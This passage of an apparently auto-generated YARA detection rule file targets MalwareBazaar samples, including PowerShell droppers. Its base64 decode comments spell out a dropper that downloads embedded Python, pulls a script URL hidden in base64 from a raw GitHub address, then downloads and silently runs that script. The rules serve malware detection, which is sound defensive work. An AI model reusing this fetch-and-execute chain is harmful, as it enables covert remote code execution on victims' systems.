      $s20 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string '          ' */
   condition:
      uint16(0) == 0x413d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule b49fac5f49c011afbd02bb1c973259e28d29a027dc48a6b8c0a6a985c74ef4b0 {
   meta:
      description = "evidences - file b49fac5f49c011afbd02bb1c973259e28d29a027dc48a6b8c0a6a985c74ef4b0.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "b49fac5f49c011afbd02bb1c973259e28d29a027dc48a6b8c0a6a985c74ef4b0"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "BAAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* reversed goodware string 'AAAAAAAAAAAB' */
      $s4 = "3249pMw5DerTgDciE1LqcbfgEYerTgDgOnIIMQltPAJkQCJkQCJkQCJkQCZyxsrWkhFJkQ0xTdWYerTgDACJEdMEEPIAAciwoTCJ09PUIRCRNugaKoGAAAwxmBDJctIB" ascii
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                 ' */
      $s6 = "DAAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */
      $s7 = "AAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '             ' */
      $s8 = "FUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQB" ascii /* base64 encoded string 'Q EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ ' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 @  @            ' */
      $s10 = "AAAAAAAABA" ascii /* reversed goodware string 'ABAAAAAAAA' */
      $s11 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s12 = "AABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '  @                                                                                             ' */
      $s13 = "AAAAAAAAAAAAE" ascii /* base64 encoded string '         ' */
      $s14 = "QABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABE" ascii /* base64 encoded string '@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D' */
      $s15 = "REREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREQABEQABEQABEQABEQABEQABEQABEQABEQABEQABE" ascii /* base64 encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D' */
      $s16 = "B4AfTFgD65fAOo33B4ge1EgD6VTAOo3EB4geTEgD5xfAOkH/B4geTEgD6dbAOoHTB4QeCHgD59YAOo33B4QeuFgD5xWAOkHTB4ggIGgDCiYAOIIPB4wgkGgDBudAOE4A" ascii
      $s17 = "sYkxzuiRGfiKGZcspYkxjgiRG/0JGZsLmYkxNViRGjNJGZ8SjYkxlLiRGnUIGZs5gYkxH9hRGbiHGZcRdYkxXzhRGP0GGZ86aYkxBlhRGDCGGZ8XXYkxHbhRG3VFGZsz" ascii
      $s18 = "tFgD55gsjhZQA0c3tBQzd3GETpTNB6aagNnMnGlwKJnzkrgzL4W26mSzvYbXNElsLRg1IVatiuW8DerTgDGw3HgDCyfAOIoqGqmC9EgDCyfAOII//GYC/a9KyUu5iObe" ascii
      $s19 = "ElRxAQUGFDARZANAElReAQUGgBARaIAAElh8AQUGtAARacBAAAAAAAAAAIC00LzJSVgoMorPAhMcedO/LOG0yIlM8WsIiUXVqOSgJ/TuJZON2cXqNTxyuulS2MpQeIvb" ascii
      $s20 = "EKv7VGLeBhRmYsRurl38wKN2XEfJ3GeyewD31p4vPO3IL52eZ3UNIyChvHZAxz6si/a23q4ZhO6JjnWhr/DqDmSh8pmSzr9fKZnwKTP7EXlevKl7EALiossW8yaaUfKA" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule d817015e2f1a6be55b297a34fb8ecd44630b2fbfb4ea7ee941d23908a88106e5 {
   meta:
      description = "evidences - file d817015e2f1a6be55b297a34fb8ecd44630b2fbfb4ea7ee941d23908a88106e5.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "d817015e2f1a6be55b297a34fb8ecd44630b2fbfb4ea7ee941d23908a88106e5"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii
      $s2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/>" fullword ascii
      $s3 = "ReimageRepair.exe" fullword wide
      $s4 = "www.reimageplus.com 0" fullword ascii
      $s5 = "-http://crl3.digicert.com/EVCodeSigning-g1.crl03" fullword ascii
      $s6 = "7http://cacerts.digicert.com/DigiCertEVCodeSigningCA.crt0" fullword ascii
      $s7 = "-http://crl4.digicert.com/EVCodeSigning-g1.crl0K" fullword ascii
      $s8 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">notset</dpiAware>" fullword ascii
      $s9 = "<description>Nullsoft Install System v2.46.5-Unicode</description>" fullword ascii
      $s10 = "Reimage" fullword wide
      $s11 = "|B -Y#" fullword ascii
      $s12 = "1lad -3" fullword ascii
      $s13 = "BLzyAbL0" fullword ascii
      $s14 = "bbGxPWX7" fullword ascii
      $s15 = "J,K. /h" fullword ascii
      $s16 = "q* fVW" fullword ascii
      $s17 = "Strovolos1" fullword ascii
      $s18 = "Z^+3z]** z;" fullword ascii
      $s19 = " -Hh-#" fullword ascii
      $s20 = " Microsoft Code Verification Root0" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_4b68a883bd709b821f753e68f1bee2b350f3d010f65336fca511485b0467b96f {
   meta:
      description = "evidences - file 4b68a883bd709b821f753e68f1bee2b350f3d010f65336fca511485b0467b96f.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "4b68a883bd709b821f753e68f1bee2b350f3d010f65336fca511485b0467b96f"
   strings:
      $s1 = "TwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAEMAbwBuAHQAZQBuAHQAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMA" ascii /* base64 encoded string 'O b j e c t   - E x p a n d P r o p e r t y   C o n t e n t ;   I n v o k e - W e b R e q u e s ' */
      $s2 = "cAB5ACIAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFAAeQB0AGgAbwBuAEQAbwB3AG4AbABvAGEAZABVAHIAbAAgAC0A" ascii /* base64 encoded string 'p y " ;   I n v o k e - W e b R e q u e s t   - U r i   $ P y t h o n D o w n l o a d U r l   - ' */
      $s3 = "bABTAG8AdQByAGMAZQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsA" ascii /* base64 encoded string 'l S o u r c e = [ S y s t e m . T e x t . E n c o d i n g ] : : U T F 8 . G e t S t r i n g ( [ ' */
      $s4 = "dABoADsAIAAkAFAAeQB0AGgAbwBuAEUAeABlAFAAYQB0AGgAPQBKAG8AaQBuAC0AUABhAHQAaAAgACQAUAB5AHQAaABvAG4AVQBuAHAAYQBjAGsAUABhAHQAaAAgACIA" ascii /* base64 encoded string 't h ;   $ P y t h o n E x e P a t h = J o i n - P a t h   $ P y t h o n U n p a c k P a t h   " ' */
      $s5 = "WABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADIAZABvAFoARABjADQAYwB5ADkAaABjADIAWgBoAGMA" ascii /* base64 encoded string 'X c u Z 2 l 0 a H V i d X N l c m N v b n R l b n Q u Y 2 9 t L 2 d o Z D c 4 c y 9 h c 2 Z h c ' */
      $s6 = "bQBwAEYAbwBsAGQAZQByACAAIgBwAHkAdABoAG8AbgAtADMALgAxADAALgA0AC0AZQBtAGIAZQBkADIAIgA7ACAAJABQAHkAdABoAG8AbgBTAGMAcgBpAHAAdABVAHIA" ascii /* base64 encoded string 'm p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m b e d 2 " ;   $ P y t h o n S c r i p t U r ' */
      $s7 = "dAAgAC0AVQByAGkAIAAkAFAAeQB0AGgAbwBuAFMAYwByAGkAcAB0AFUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABQAHkAdABoAG8AbgBTAGMAcgBpAHAAdABQAGEA" ascii /* base64 encoded string 't   - U r i   $ P y t h o n S c r i p t U r l   - O u t F i l e   $ P y t h o n S c r i p t P a ' */
      $s8 = "TwB1AHQARgBpAGwAZQAgACQAUAB5AHQAaABvAG4AWgBpAHAAUABhAHQAaAA7ACAARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEAdABoACAAJABQAHkA" ascii /* base64 encoded string 'O u t F i l e   $ P y t h o n Z i p P a t h ;   E x p a n d - A r c h i v e   - P a t h   $ P y ' */
      $s9 = "UAB5AHQAaABvAG4AUwBjAHIAaQBwAHQAVQByAGwAUwBvAHUAcgBjAGUAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAFMAZQBsAGUAYwB0AC0A" ascii /* base64 encoded string 'P y t h o n S c r i p t U r l S o u r c e   - U s e B a s i c P a r s i n g   |   S e l e c t - ' */
      $s10 = "aABvAG4AUwBjAHIAaQBwAHQAUABhAHQAaAA9AEoAbwBpAG4ALQBQAGEAdABoACAAJABQAHkAdABoAG8AbgBVAG4AcABhAGMAawBQAGEAdABoACAAIgBjAG8AZABlAC4A" ascii /* base64 encoded string 'h o n S c r i p t P a t h = J o i n - P a t h   $ P y t h o n U n p a c k P a t h   " c o d e . ' */
      $s11 = "eQB0AGgAbwBuAC8AMwAuADEAMAAuADQALwBwAHkAdABoAG8AbgAtADMALgAxADAALgA0AC0AZQBtAGIAZQBkAC0AYQBtAGQANgA0AC4AegBpAHAAIgA7ACAAJABUAGUA" ascii /* base64 encoded string 'y t h o n / 3 . 1 0 . 4 / p y t h o n - 3 . 1 0 . 4 - e m b e d - a m d 6 4 . z i p " ;   $ T e ' */
      $s12 = "YgBlAGQALQBhAG0AZAA2ADQAMgAuAHoAaQBwACIAOwAgACQAUAB5AHQAaABvAG4AVQBuAHAAYQBjAGsAUABhAHQAaAA9AEoAbwBpAG4ALQBQAGEAdABoACAAJABUAGUA" ascii /* base64 encoded string 'b e d - a m d 6 4 2 . z i p " ;   $ P y t h o n U n p a c k P a t h = J o i n - P a t h   $ T e ' */
      $s13 = "UABhAHQAaAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAkAFAAeQB0AGgAbwBuAFMAYwByAGkAcAB0AFAAYQB0AGgAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8A" ascii /* base64 encoded string 'P a t h   - A r g u m e n t L i s t   $ P y t h o n S c r i p t P a t h   - N o N e w W i n d o ' */
      $s14 = "bgBaAGkAcABQAGEAdABoAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFQAZQBtAHAARgBvAGwAZABlAHIAIAAiAHAAeQB0AGgAbwBuAC0AMwAuADEAMAAuADQALQBlAG0A" ascii /* base64 encoded string 'n Z i p P a t h = J o i n - P a t h   $ T e m p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m ' */
      $s15 = "cAB5AHQAaABvAG4AdwAuAGUAeABlACIAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAUAB5AHQAaABvAG4ARQB4AGUA" ascii /* base64 encoded string 'p y t h o n w . e x e " ;   S t a r t - P r o c e s s   - F i l e P a t h   $ P y t h o n E x e ' */
      $s16 = "dABoAG8AbgBaAGkAcABQAGEAdABoACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AUABhAHQAaAAgACQAUAB5AHQAaABvAG4AVQBuAHAAYQBjAGsAUABhAHQAaAAgAC0A" ascii /* base64 encoded string 't h o n Z i p P a t h   - D e s t i n a t i o n P a t h   $ P y t h o n U n p a c k P a t h   - ' */
      $s17 = "UwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkA" ascii /* base64 encoded string 'S y s t e m . C o n v e r t ] : : F r o m B a s e 6 4 S t r i n g ( ' a H R 0 c H M 6 L y 9 y Y ' */
      $s18 = "RgBvAHIAYwBlADsAIAAkAFAAeQB0AGgAbwBuAFMAYwByAGkAcAB0AFUAcgBsAD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQA" ascii /* base64 encoded string 'F o r c e ;   $ P y t h o n S c r i p t U r l = I n v o k e - W e b R e q u e s t   - U r i   $ ' */
      $s19 = "bQBwAEYAbwBsAGQAZQByAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAVABlAG0AcABQAGEAdABoACgAKQA7ACAAJABQAHkAdABoAG8A" ascii /* base64 encoded string 'm p F o l d e r = [ S y s t e m . I O . P a t h ] : : G e t T e m p P a t h ( ) ;   $ P y t h o ' */
      $s20 = "JABQAHkAdABoAG8AbgBEAG8AdwBuAGwAbwBhAGQAVQByAGwAPQAiAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAHAAeQB0AGgAbwBuAC4AbwByAGcALwBmAHQAcAAvAHAA" ascii /* base64 encoded string '$ P y t h o n D o w n l o a d U r l = " h t t p s : / / w w w . p y t h o n . o r g / f t p / p ' */
   condition:
      uint16(0) == 0x414a and filesize < 7KB and
      8 of them
}

rule b3c273fb7ef50d4e0e32f1316e065d6c658dc1b31571dd19d97f4db18dc02ef3 {
   meta:
      description = "evidences - file b3c273fb7ef50d4e0e32f1316e065d6c658dc1b31571dd19d97f4db18dc02ef3.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "b3c273fb7ef50d4e0e32f1316e065d6c658dc1b31571dd19d97f4db18dc02ef3"
   strings:
      $s1 = "UgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFAAeQB0AGgAbwBuAFMAYwByAGkAcAB0AFUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABQAHkAdABoAG8AbgBTAGMA" ascii /* base64 encoded string 'R e q u e s t   - U r i   $ P y t h o n S c r i p t U r l   - O u t F i l e   $ P y t h o n S c ' */
      $s2 = "IgBjAG8AZABlAC4AcAB5ACIAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFAAeQB0AGgAbwBuAEQAbwB3AG4AbABvAGEA" ascii /* base64 encoded string '" c o d e . p y " ;   I n v o k e - W e b R e q u e s t   - U r i   $ P y t h o n D o w n l o a ' */
      $s3 = "dQBaADIAbAAwAGEASABWAGkAZABYAE4AbABjAG0ATgB2AGIAbgBSAGwAYgBuAFEAdQBZADIAOQB0AEwAMgBkAG8AWgBEAGMANABjAHkAOQAzAGMAMgB4AHkAZABDADkA" ascii /* base64 encoded string 'u Z 2 l 0 a H V i d X N l c m N v b n R l b n Q u Y 2 9 t L 2 d o Z D c 4 c y 9 3 c 2 x y d C 9 ' */
      $s4 = "ZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAEMAbwBuAHQAZQBuAHQAOwAgAEkAbgB2AG8AawBlAC0AVwBlAGIA" ascii /* base64 encoded string 'e l e c t - O b j e c t   - E x p a n d P r o p e r t y   C o n t e n t ;   I n v o k e - W e b ' */
      $s5 = "cgBpAHAAdABQAGEAdABoADsAIAAkAFAAeQB0AGgAbwBuAEUAeABlAFAAYQB0AGgAPQBKAG8AaQBuAC0AUABhAHQAaAAgACQAUAB5AHQAaABvAG4AVQBuAHAAYQBjAGsA" ascii /* base64 encoded string 'r i p t P a t h ;   $ P y t h o n E x e P a t h = J o i n - P a t h   $ P y t h o n U n p a c k ' */
      $s6 = "eQB0AGgAbwBuAC8AMwAuADEAMAAuADQALwBwAHkAdABoAG8AbgAtADMALgAxADAALgA0AC0AZQBtAGIAZQBkAC0AYQBtAGQANgA0AC4AegBpAHAAIgA7ACAAJABUAGUA" ascii /* base64 encoded string 'y t h o n / 3 . 1 0 . 4 / p y t h o n - 3 . 1 0 . 4 - e m b e d - a m d 6 4 . z i p " ;   $ T e ' */
      $s7 = "bgBaAGkAcABQAGEAdABoAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFQAZQBtAHAARgBvAGwAZABlAHIAIAAiAHAAeQB0AGgAbwBuAC0AMwAuADEAMAAuADQALQBlAG0A" ascii /* base64 encoded string 'n Z i p P a t h = J o i n - P a t h   $ T e m p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m ' */
      $s8 = "bQBwAEYAbwBsAGQAZQByAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAVABlAG0AcABQAGEAdABoACgAKQA7ACAAJABQAHkAdABoAG8A" ascii /* base64 encoded string 'm p F o l d e r = [ S y s t e m . I O . P a t h ] : : G e t T e m p P a t h ( ) ;   $ P y t h o ' */
      $s9 = "JABQAHkAdABoAG8AbgBEAG8AdwBuAGwAbwBhAGQAVQByAGwAPQAiAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAHAAeQB0AGgAbwBuAC4AbwByAGcALwBmAHQAcAAvAHAA" ascii /* base64 encoded string '$ P y t h o n D o w n l o a d U r l = " h t t p s : / / w w w . p y t h o n . o r g / f t p / p ' */
      $s10 = "dABoACAAJABQAHkAdABoAG8AbgBaAGkAcABQAGEAdABoACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AUABhAHQAaAAgACQAUAB5AHQAaABvAG4AVQBuAHAAYQBjAGsA" ascii /* base64 encoded string 't h   $ P y t h o n Z i p P a t h   - D e s t i n a t i o n P a t h   $ P y t h o n U n p a c k ' */
      $s11 = "LQBVAHIAaQAgACQAUAB5AHQAaABvAG4AUwBjAHIAaQBwAHQAVQByAGwAUwBvAHUAcgBjAGUAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAAfAAgAFMA" ascii /* base64 encoded string '- U r i   $ P y t h o n S c r i p t U r l S o u r c e   - U s e B a s i c P a r s i n g   |   S ' */
      $s12 = "UABhAHQAaAAgAC0ARgBvAHIAYwBlADsAIAAkAFAAeQB0AGgAbwBuAFMAYwByAGkAcAB0AFUAcgBsAD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAA" ascii /* base64 encoded string 'P a t h   - F o r c e ;   $ P y t h o n S c r i p t U r l = I n v o k e - W e b R e q u e s t   ' */
      $s13 = "ZABVAHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAUAB5AHQAaABvAG4AWgBpAHAAUABhAHQAaAA7ACAARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBQAGEA" ascii /* base64 encoded string 'd U r l   - O u t F i l e   $ P y t h o n Z i p P a t h ;   E x p a n d - A r c h i v e   - P a ' */
      $s14 = "eQBaAFcAWgB6AEwAMgBoAGwAWQBXAFIAegBMADIAMQBoAGEAVwA0AHYAWgAyAFYAcABiADMAVgBvAFoAMgBoAHAAYwAzAFYAawBMAG4AUgA0AGQAQQA9AD0AJwApACkA" ascii /* base64 encoded string 'y Z W Z z L 2 h l Y W R z L 2 1 h a W 4 v Z 2 V p b 3 V o Z 2 h p c 3 V k L n R 4 d A = = ' ) ) ' */
      $s15 = "cwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBIAFIAMABjAEgATQA2AEwAeQA5AHkAWQBYAGMA" ascii /* base64 encoded string 's t e m . C o n v e r t ] : : F r o m B a s e 6 4 S t r i n g ( ' a H R 0 c H M 6 L y 9 y Y X c ' */
      $s16 = "cABGAG8AbABkAGUAcgAgACIAcAB5AHQAaABvAG4ALQAzAC4AMQAwAC4ANAAtAGUAbQBiAGUAZAAiADsAIAAkAFAAeQB0AGgAbwBuAFMAYwByAGkAcAB0AFUAcgBsAFMA" ascii /* base64 encoded string 'p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m b e d " ;   $ P y t h o n S c r i p t U r l S ' */
      $s17 = "YgBlAGQALQBhAG0AZAA2ADQALgB6AGkAcAAiADsAIAAkAFAAeQB0AGgAbwBuAFUAbgBwAGEAYwBrAFAAYQB0AGgAPQBKAG8AaQBuAC0AUABhAHQAaAAgACQAVABlAG0A" ascii /* base64 encoded string 'b e d - a m d 6 4 . z i p " ;   $ P y t h o n U n p a c k P a t h = J o i n - P a t h   $ T e m ' */
      $s18 = "bwB1AHIAYwBlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkA" ascii /* base64 encoded string 'o u r c e = [ S y s t e m . T e x t . E n c o d i n g ] : : U T F 8 . G e t S t r i n g ( [ S y ' */
      $s19 = "UABhAHQAaAAgACIAcAB5AHQAaABvAG4AdwAuAGUAeABlACIAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAUAB5AHQA" ascii /* base64 encoded string 'P a t h   " p y t h o n w . e x e " ;   S t a r t - P r o c e s s   - F i l e P a t h   $ P y t ' */
      $s20 = "OwAgACQAUAB5AHQAaABvAG4AUwBjAHIAaQBwAHQAUABhAHQAaAA9AEoAbwBpAG4ALQBQAGEAdABoACAAJABQAHkAdABoAG8AbgBVAG4AcABhAGMAawBQAGEAdABoACAA" ascii /* base64 encoded string ';   $ P y t h o n S c r i p t P a t h = J o i n - P a t h   $ P y t h o n U n p a c k P a t h   ' */
   condition:
      uint16(0) == 0x414a and filesize < 7KB and
      8 of them
}

rule f4277859900c63f677886c9fa2c6ef6c5a53935f9b17490cd252de18e3c766d5 {
   meta:
      description = "evidences - file f4277859900c63f677886c9fa2c6ef6c5a53935f9b17490cd252de18e3c766d5.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "f4277859900c63f677886c9fa2c6ef6c5a53935f9b17490cd252de18e3c766d5"
   strings:
      $s1 = "JABQAHkAdABoAG8AbgBEAG8AdwBuAGwAbwBhAGQAVQByAGwAPQAiAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAHAAeQB0AGgAbwBuAC4AbwByAGcALwBmAHQAcAAvAHAA" ascii /* base64 encoded string '$ P y t h o n D o w n l o a d U r l = " h t t p s : / / w w w . p y t h o n . o r g / f t p / p y t h o n / 3 . 1 0 . 4 / p y t h o n - 3 . 1 0 . 4 - e m b e d - a m d 6 4 . z i p " ;   $ T e m p F o l d e r = [ S y s t e m . I O . P a t h ] : : G e t T e m p P a t h ( ) ;   $ P y t h o n Z i p P a t h = J o i n - P a t h   $ T e m p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m b e d - a m d 6 4 . z i p " ;   $ P y t h o n U n p a c k P a t h = J o i n - P a t h   $ T e m p F o l d e r   " p y t h o n - 3 . 1 0 . 4 - e m b e d " ;   $ P y t h o n S c r i p t U r l S o u r c e = [ S y s t e m . T e x t . E n c o d i n g ] : : U T F 8 . G e t S t r i n g ( [ S y s t e m . C o n v e r t ] : : F r o m B a s e 6 4 S t r i n g ( ' a H R 0 c H M 6 L y 9 y Y X c u Z 2 l 0 a H V i d X N l c m N v b n R l b n Q u Y 2 9 t L 2 d o Z D c 4 c y 9 3 c 2 x y d C 9 y Z W Z z L 2 h l Y W R z L 2 1 h a W 4 v c G 9 m a 2 R v L n R 4 d A = = ' ) ) ;   $ P y t h o n S c r i p t P a t h = J o i n - P a t h   $ P y t h o n U n p a c k P a t h   " a d . p y " ;   I n v o k e - W e b R e q u e s t   - U r i   $ P y t h o n D o w n l o a d U r l   - O u t F i l e   $ P y t h o n Z i p P a t h ;   E x p a n d - A r c h i v e   - P a t h   $ P y t h o n Z i p P a t h   - D e s t i n a t i o n P a t h   $ P y t h o n U n p a c k P a t h   - F o r c e ;   $ P y t h o n S c r i p t U r l = I n v o k e - W e b R e q u e s t   - U r i   $ P y t h o n S c r i p t U r l S o u r c e   - U s e B a s i c P a r s i n g   |   S e l e c t - O b j e c t   - E x p a n d P r o p e r t y   C o n t e n t ;   I n v o k e - W e b R e q u e s t   - U r i   $ P y t h o n S c r i p t U r l   - O u t F i l e   $ P y t h o n S c r i p t P a t h ;   $ P y t h o n E x e P a t h = J o i n - P a t h   $ P y t h o n U n p a c k P a t h   " p y t h o n w . e x e " ;   S t a r t - P r o c e s s   - F i l e P a t h   $ P y t h o n E x e P a t h   - A r g u m e n t L i s t   $ P y t h o n S c r i p t P a t h   - N o N e w W i n d o w ' */
      $s2 = "ZQA7ACAAJABQAHkAdABoAG8AbgBTAGMAcgBpAHAAdABVAHIAbAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFAAeQB0AGgA" ascii /* base64 encoded string 'e ;   $ P y t h o n S c r i p t U r l = I n v o k e - W e b R e q u e s t   - U r i   $ P y t h ' */
      $s3 = "dQBaADIAbAAwAGEASABWAGkAZABYAE4AbABjAG0ATgB2AGIAbgBSAGwAYgBuAFEAdQBZADIAOQB0AEwAMgBkAG8AWgBEAGMANABjAHkAOQAzAGMAMgB4AHkAZABDADkA" ascii /* base64 encoded string 'u Z 2 l 0 a H V i d X N l c m N v b n R l b n Q u Y 2 9 t L 2 d o Z D c 4 c y 9 3 c 2 x y d C 9 ' */
      $s4 = "JABQAHkAdABoAG8AbgBFAHgAZQBQAGEAdABoAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFAAeQB0AGgAbwBuAFUAbgBwAGEAYwBrAFAAYQB0AGgAIAAiAHAAeQB0AGgA" ascii /* base64 encoded string '$ P y t h o n E x e P a t h = J o i n - P a t h   $ P y t h o n U n p a c k P a t h   " p y t h ' */
      $s5 = "bgBTAGMAcgBpAHAAdABQAGEAdABoAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAFAAeQB0AGgAbwBuAFUAbgBwAGEAYwBrAFAAYQB0AGgAIAAiAGEAZAAuAHAAeQAiADsA" ascii /* base64 encoded string 'n S c r i p t P a t h = J o i n - P a t h   $ P y t h o n U n p a c k P a t h   " a d . p y " ; ' */
      $s6 = "aQBsAGUAIAAkAFAAeQB0AGgAbwBuAFoAaQBwAFAAYQB0AGgAOwAgAEUAeABwAGEAbgBkAC0AQQByAGMAaABpAHYAZQAgAC0AUABhAHQAaAAgACQAUAB5AHQAaABvAG4A" ascii /* base64 encoded string 'i l e   $ P y t h o n Z i p P a t h ;   E x p a n d - A r c h i v e   - P a t h   $ P y t h o n ' */
